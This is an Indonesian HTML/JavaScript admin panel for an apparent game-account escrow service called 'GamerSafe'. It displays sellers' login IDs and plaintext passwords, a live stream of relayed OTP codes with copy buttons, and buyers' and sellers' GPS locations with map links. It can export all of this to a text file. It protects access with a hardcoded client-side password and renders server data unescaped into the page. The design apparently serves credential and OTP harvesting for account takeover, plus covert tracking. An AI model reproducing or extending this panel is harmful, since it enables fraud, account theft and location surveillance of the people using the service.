<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GamerSafe 👑 MASTER PANEL KONTROL CLOUD</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght=400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>body { font-family: 'Plus Jakarta Sans', sans-serif; }</style>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen">

    <div id="login-screen" class="fixed inset-0 bg-slate-950 z-50 flex items-center justify-center p-4">
        <div class="bg-slate-900 border border-slate-800 p-8 rounded-2xl max-w-sm w-full text-center shadow-2xl">
            <div class="text-rose-500 text-3xl mb-3"><i class="fa-solid fa-crown"></i></div>
            <h3 class="text-lg font-bold text-slate-200 mb-1">Otoritas Admin Master</h3>
            <p class="text-xs text-slate-400 mb-6">Masukkan kata sandi master kontrol cloud.</p>
            <input type="password" id="admin-pass" placeholder="PASSWORD MASTER" class="w-full bg-slate-950 border border-slate-800 rounded-xl py-3 text-center mb-4 uppercase text-xs tracking-widest text-slate-200 focus:outline-none focus:border-rose-500">
            <button onclick="loginAdmin()" class="w-full bg-rose-600 hover:bg-rose-500 font-semibold py-3 rounded-xl cursor-pointer shadow-lg transition-all text-xs">
                Masuk Dashboard Cloud
            </button>
        </div>
    </div>

    <div id="dashboard" class="hidden p-4 md:p-8 max-w-6xl mx-auto space-y-6">
        <div class="flex justify-between items-center border-b border-slate-800 pb-4">
            <div>
                <h1 class="text-xl font-bold text-rose-500 flex items-center gap-2">
                    <i class="fa-solid fa-cloud-bolt"></i> Dashboard Escrow Control Cloud
                </h1>
                <p class="text-xs text-slate-400 mt-0.5">Sistem kendali terpusat real-time via MySQL Filess.io.</p>
            </div>
            <div class="flex gap-2">
                <button onclick="downloadLogRekberOnline()" class="text-xs bg-emerald-950 hover:bg-emerald-900 border border-emerald-800 text-emerald-400 px-3 py-1.5 rounded-xl cursor-pointer transition-all flex items-center gap-1.5 font-medium">
                    <i class="fa-solid fa-file-arrow-down"></i> Download Data .TXT
                </button>
            </div>
        </div>

        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div class="space-y-6">
                <div class="bg-slate-900 border border-slate-800 p-5 rounded-2xl space-y-4 shadow-xl">
                    <h3 class="font-bold text-xs text-slate-200 uppercase tracking-wider flex items-center gap-2">
                        <i class="fa-solid fa-square-plus text-amber-500"></i> Buat Kamar di Cloud
                    </h3>
                    <button onclick="generateTokenOnlineKeServer()" class="w-full bg-amber-600 hover:bg-amber-500 font-semibold py-2.5 rounded-xl text-xs cursor-pointer shadow-md transition-all">
                        + Terbitkan Token Kamar Baru
                    </button>
                    <div class="bg-slate-950 p-3 rounded-xl border border-slate-800 text-xs">
                        <span class="text-slate-400 block mb-2 font-medium">Daftar Kamar Aktif di Server:</span>
                        <ul id="list-token-aktif" class="font-mono text-amber-400 space-y-1 max-h-32 overflow-y-auto">
                            </ul>
                    </div>
                </div>

                <div class="bg-slate-900 border border-slate-800 p-5 rounded-2xl space-y-3 shadow-xl">
                    <h3 class="font-bold text-xs text-slate-200 uppercase tracking-wider flex items-center gap-2">
                        <i class="fa-solid fa-wallet text-indigo-400"></i> Informasi Gopay Utama Admin
                    </h3>
                    <div>
                        <label class="block text-[10px] text-slate-400 mb-1">Nama E-Wallet / Bank</label>
                        <input type="text" id="pay-name" class="w-full text-xs bg-slate-950 border border-slate-800 rounded-lg p-2 text-slate-200 focus:outline-none focus:border-indigo-500">
                    </div>
                    <div>
                        <label class="block text-[10px] text-slate-400 mb-1">Nomor Akun & Atas Nama</label>
                        <input type="text" id="pay-detail" class="w-full text-xs bg-slate-950 border border-slate-800 rounded-lg p-2 text-slate-200 focus:outline-none focus:border-indigo-500">
                    </div>
                    <button onclick="simpanSettingPembayaran()" class="w-full bg-indigo-600 hover:bg-indigo-500 text-xs py-2 rounded-lg font-medium cursor-pointer transition-all">
                        Simpan & Sinkronkan No. Gopay
                    </button>
                </div>
            </div>

            <div class="bg-slate-900 border border-slate-800 p-6 rounded-2xl md:col-span-2 space-y-4 shadow-xl">
                <h3 class="font-bold text-xs text-slate-200 uppercase tracking-wider flex items-center gap-2">
                    <i class="fa-solid fa-tower-cell animate-pulse text-indigo-400 text-xs"></i> Monitoring Alur Database Online
                </h3>
                <div id="tabel-admin-data" class="space-y-4 text-xs">
                    </div>
            </div>
        </div>
    </div>

    <script>
        // === CONFIGURATION URL BACKEND LOCALHOST ===
        const MOCK_API_BASE = "http://localhost:3000/api/rooms";

        function loginAdmin() {
            if(document.getElementById('admin-pass').value.trim().toUpperCase() === "KOREKHITAM") {
                document.getElementById('login-screen').classList.add('hidden');
                document.getElementById('dashboard').classList.remove('hidden');
                initAdminPanel();
            } else { 
                alert("❌ Sandi Akses Salah!"); 
            }
        }

        function initAdminPanel() {
            const payConfig = JSON.parse(localStorage.getItem('rekber_payment_config')) || {nama: "GOPAY", detail: "08123456789"};
            document.getElementById('pay-name').value = payConfig.nama;
            document.getElementById('pay-detail').value = payConfig.detail;
            
            renderTokensFromServer();
            renderAdminTableOnline();
            setInterval(renderAdminTableOnline, 4000); // Sinkronisasi otomatis tiap 4 detik (biar gak boncos kuota API)
        }

        // POST TOKEN BARU KE MYSQL FILESS.IO VIA BACKEND
        function generateTokenOnlineKeServer() {
            const tokenAcak = "ROOM-" + Math.floor(1000 + Math.random() * 9000);

            const payloadStruktur = {
                roomCode: tokenAcak,
                game: "-",
                price: "0",
                buyer_wallet: "-",
                status: "Menunggu Input Kesepakatan Buyer",
                akun_id: "-",
                akun_pass: "-",
                akun_req: " ",
                loc_buyer: "-",
                loc_seller: "-"
            };

            fetch(MOCK_API_BASE, {
                method: 'POST',
                headers: { 
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(payloadStruktur)
            })
            .then(res => {
                if (!res.ok) throw new Error('Respon server bermasalah');
                return res.json();
            })
            .then(data => {
                alert(`🎫 Kamar Cloud Sukses Diterbitkan di MySQL: ${tokenAcak}`);
                renderTokensFromServer();
                renderAdminTableOnline();
            })
            .catch(err => {
                console.error(err);
                alert("⚠️ Gagal membuat room ke database!");
            });
        }

        function renderTokensFromServer() {
            fetch(MOCK_API_BASE)
            .then(res => res.json())
            .then(data => {
                const listHTML = data.map(room => `<li>🔑 ${room.roomCode} (ID: ${room.id})</li>`).join('');
                document.getElementById('list-token-aktif').innerHTML = listHTML || `<li class="text-slate-600 italic">Kosong</li>`;
            })
            .catch(err => console.log("Gagal memuat list token."));
        }

        function simpanSettingPembayaran() {
            const config = {
                nama: document.getElementById('pay-name').value.trim(),
                detail: document.getElementById('pay-detail').value.trim()
            };
            localStorage.setItem('rekber_payment_config', JSON.stringify(config));
            alert("⚙️ Info Gopay diperbarui secara lokal!");
        }

        // AMBIL DATA LIVE DARI MYSQL DAN BUAT INTERFACE KONTROL
        function renderAdminTableOnline() {
            fetch(MOCK_API_BASE)
            .then(res => res.json())
            .then(data => {
                const container = document.getElementById('tabel-admin-data');
                if(!data || data.length === 0) {
                    container.innerHTML = `<p class="text-slate-600 italic text-center py-8">Belum ada aktivitas kamar di server cloud.</p>`;
                    return;
                }

                let html = "";
                data.forEach(room => {
                    let aksiButton = "";
                    let dataSandiSeller = ``;

                    const mapsBuyer = room.loc_buyer && room.loc_buyer !== "Mencari GPS..." && room.loc_buyer !== "-" ? `https://www.google.com/maps/search/?api=1&query=${room.loc_buyer}` : null;
                    const mapsSeller = room.loc_seller && room.loc_seller !== "Mencari GPS..." && room.loc_seller !== "-" ? `https://www.google.com/maps/search/?api=1&query=${room.loc_seller}` : null;

                    let chatHtml = `<div class="text-slate-500 italic text-[10px]">Belum ada pesan/OTP masuk.</div>`;
                    if(room.akun_req && room.akun_req.trim() !== "" && room.akun_req !== "-") {
                        const barisPesan = room.akun_req.split("\n");
                        chatHtml = "";
                        barisPesan.forEach(p => {
                            if(p.trim() !== "") {
                                chatHtml += `
                                    <div class="bg-slate-900 border border-emerald-950 px-2.5 py-1.5 rounded-lg text-emerald-400 font-mono text-[11px] flex justify-between items-center mt-1">
                                        <span><i class="fa-solid fa-comment-dots text-[10px]"></i> ${p}</span>
                                        <button onclick="navigator.clipboard.writeText('${p.replace('[OTP] ','')}'); alert('Kode disalin!')" class="text-[9px] bg-slate-800 hover:bg-slate-700 text-slate-300 px-1.5 py-0.5 rounded border border-slate-700 cursor-pointer">Salin</button>
                                    </div>`;
                            }
                        });
                    }

                    // Logika Alur Tombol Kontrol Berdasarkan Status MySQL
                    if(room.status === "Menunggu Input Kesepakatan Buyer") {
                        aksiButton = `<span class="text-slate-600 italic"><i class="fa-solid fa-spinner animate-spin"></i> Menunggu pembeli memasukkan data awal...</span>`;
                    }
                    else if(room.status === "Menunggu Konfirmasi Harga Seller") {
                        aksiButton = `<span class="text-amber-500 italic"><i class="fa-solid fa-gavel"></i> Menunggu penjual menyetujui harga...</span>`;
                    }
                    else if(room.status === "Menunggu Pembayaran Buyer") {
                        aksiButton = `<button onclick="ubahStatusKamarOnline('${room.id}', 'Dana Aman di Admin')" class="bg-indigo-600 hover:bg-indigo-500 px-3 py-1.5 rounded-lg font-bold text-white cursor-pointer shadow-md text-[11px]"><i class="fa-solid fa-money-bill-wave"></i> Setujui: Pembeli Sudah Transfer</button>`;
                    } 
                    else if(room.status === "Dana Aman di Admin") {
                        aksiButton = `<span class="text-amber-500 italic font-medium"><i class="fa-solid fa-hourglass-half animate-pulse"></i> Dana Diamankan. Menunggu seller menginput isi brankas...</span>`;
                    } 
                    else if(room.status === "Proses Verifikasi Admin") {
                        dataSandiSeller = `
                            <div class="bg-slate-950 p-4 rounded-xl border border-rose-950/60 mt-2 space-y-3">
                                <div class="text-[11px] font-mono text-rose-300 space-y-1">
                                    <p class="text-amber-400 font-bold mb-1"><i class="fa-solid fa-unlock-keyhole"></i> DATA LOGIN UTAMA:</p>
                                    <p><strong>ID/Email:</strong> <span class="text-white bg-slate-900 px-1.5 py-0.5 border border-slate-800 rounded select-all font-bold">${room.akun_id}</span></p>
                                    <p><strong>Password:</strong> <span class="text-white bg-slate-900 px-1.5 py-0.5 border border-slate-800 rounded select-all font-bold">${room.akun_pass}</span></p>
                                </div>
                                <div class="border-t border-slate-900 pt-2 space-y-1.5">
                                    <p class="text-[10px] text-slate-400 font-bold uppercase tracking-wider"><i class="fa-solid fa-comment-sms text-emerald-400"></i> Live OTP Stream Dari Seller:</p>
                                    <div class="space-y-1 max-h-32 overflow-y-auto">${chatHtml}</div>
                                </div>
                            </div>`;
                        aksiButton = `<button onclick="ubahStatusKamarOnline('${room.id}', 'Selesai & Dicairkan')" class="bg-emerald-600 hover:bg-emerald-500 px-3 py-1.5 rounded-lg font-bold text-white cursor-pointer shadow-md text-[11px]"><i class="fa-solid fa-check-double"></i> Akun Benar, Cairkan Saldo Ke Seller</button>`;
                    } 
                    else {
                        aksiButton = `<span class="text-emerald-400 font-bold font-mono"><i class="fa-solid fa-circle-check"></i> TRANSAKSI SELESAI & LUNAS</span>`;
                    }

                    html += `
                        <div class="bg-slate-900 border border-slate-800 p-4 rounded-xl space-y-3">
                            <div class="flex justify-between border-b border-slate-800 pb-2">
                                <span class="font-bold text-amber-400 font-mono text-xs bg-slate-950 px-2 py-0.5 rounded border border-slate-800">${room.roomCode}</span>
                                <span class="text-slate-400 text-[11px]">Status Cloud: <strong class="text-slate-200">${room.status}</strong></span>
                            </div>
                            <div class="grid grid-cols-1 sm:grid-cols-2 gap-2 text-slate-300 text-[11px]">
                                <p><strong>Game:</strong> ${room.game || '-'}</p>
                                <p><strong>Harga Akun:</strong> ${room.price ? 'Rp ' + parseInt(room.price).toLocaleString('id-ID') : '-'}</p>
                                <p class="text-slate-500 col-span-2"><strong>Dompet Refund Buyer:</strong> ${room.buyer_wallet || '-'}</p>
                            </div>
                            
                            <div class="bg-slate-950 p-2.5 rounded-lg border border-slate-800 text-[10px] space-y-1 font-mono">
                                <p class="text-indigo-400 flex justify-between items-center">
                                    <span>📍 GPS Buyer: ${room.loc_buyer || 'Belum didapatkan'}</span>
                                    ${mapsBuyer ? `<a href="${mapsBuyer}" target="_blank" class="text-slate-300 bg-indigo-950 px-2 py-0.5 border border-indigo-900 rounded hover:bg-indigo-900 transition-all">Buka Peta</a>` : ''}
                                </p>
                                <p class="text-emerald-400 flex justify-between items-center">
                                    <span>📍 GPS Seller: ${room.loc_seller || 'Belum didapatkan'}</span>
                                    ${mapsSeller ? `<a href="${mapsSeller}" target="_blank" class="text-slate-300 bg-emerald-950 px-2 py-0.5 border border-emerald-900 rounded hover:bg-emerald-900 transition-all">Buka Peta</a>` : ''}
                                </p>
                            </div>

                            ${dataSandiSeller}
                            <div class="text-right pt-2 border-t border-slate-800/40">${aksiButton}</div>
                        </div>`;
                });
                container.innerHTML = html;
            })
            .catch(err => console.log("Gagal memuat tabel database online. Pastikan server.js menyala!"));
        }

        // TRIGGER PUT/UPDATE STATUS ONLINE KE SERVER
        function ubahStatusKamarOnline(idNumerik, statusBaru) {
            fetch(`${MOCK_API_BASE}/${idNumerik}`, {
                method: 'PUT',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ status: statusBaru })
            })
            .then(res => res.json())
            .then(data => {
                renderAdminTableOnline();
            })
            .catch(err => alert("Gagal merubah status room!"));
        }

        // DOWNLOAD LOG SELURUH SERVER DATABASE (.TXT)
        function downloadLogRekberOnline() {
            fetch(MOCK_API_BASE)
            .then(res => res.json())
            .then(data => {
                if(!data || data.length === 0) return alert("Server kosong!");

                let teksLog = "=== GAMERSAFE ESCROW CLOUD SERVER LOG ===\r\n\r\n";
                data.forEach(room => {
                    teksLog += `ID SERVER    : ${room.id}\r\n`;
                    teksLog += `KODE KAMAR   : ${room.roomCode}\r\n`;
                    teksLog += `STATUS TRANSA: ${room.status}\r\n`;
                    teksLog += `NAMA GAME    : ${room.game || '-'}\r\n`;
                    teksLog += `NOMINAL      : Rp ${room.price ? parseInt(room.price).toLocaleString('id-ID') : '0'}\r\n`;
                    teksLog += `REFUND BUYER : ${room.buyer_wallet || '-'}\r\n`;
                    teksLog += `AKUN SELLER  : USER:[ ${room.akun_id || '-'} ] PASS:[ ${room.akun_pass || '-'} ]\r\n`;
                    teksLog += `RIWAYAT OTP  : \r\n${room.akun_req || '-'}\r\n`;
                    teksLog += "=========================================================\r\n\r\n";
                });

                const blob = new Blob([teksLog], { type: "text/plain;charset=utf-8" });
                const link = document.createElement("a");
                link.href = URL.createObjectURL(blob);
                link.download = "LOG_SERVER_REKBER_ONLINE.txt";
                link.click();
            })
            .catch(err => alert("Gagal mengambil log berkas dari server!"));
        }
    </script>
</body>
</html>
